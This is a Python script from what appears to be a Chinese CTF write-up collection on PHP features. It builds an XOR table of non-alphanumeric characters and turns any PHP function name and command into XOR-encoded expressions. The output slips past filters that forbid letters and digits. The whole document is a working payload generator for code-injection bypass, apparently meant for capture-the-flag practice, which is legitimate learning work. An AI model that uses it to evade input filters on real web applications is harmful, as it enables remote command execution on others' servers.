# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/WP汇总/ctfshow-php特性.md
# TITLE: ctfshow-php特性
# CATEGORY: web

import re
#异或无数字字母绕过
#取得可用字符串放入文件
def get_xor_words():
    preg='[a-zA-Z0-9]'
    result=''
    #遍历扩展ascii码表
    for i in range(256):
        for j in range(256):
            if not (re.match(preg,chr(i),re.I) or re.match(preg,chr(j),re.I)):
                k=i^j
                #k在可显示字符中
                if k>=32 and k<=126:
                    # 以URL编码方式存储
                    a = '%' + hex(i)[2:].zfill(2)
                    b = '%' + hex(j)[2:].zfill(2)
                    result += (chr(k) + ' ' + a + ' ' + b + '\n')
    f=open('xor_file.txt','w')
    f.write(result)
#通过输入的命令获取无数字字母命令
def get_order(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("xor_file.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
        #异或后存入
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)

def main():
    get_xor_words()
    while True:
        s1 = input("\n[+] your function：")
        if s1 == "exit":
            break
        s2 = input("[+] your command：")
        param = get_order(s1) + get_order(s2)
        print("\n[*] result:\n" + param+";")

main()
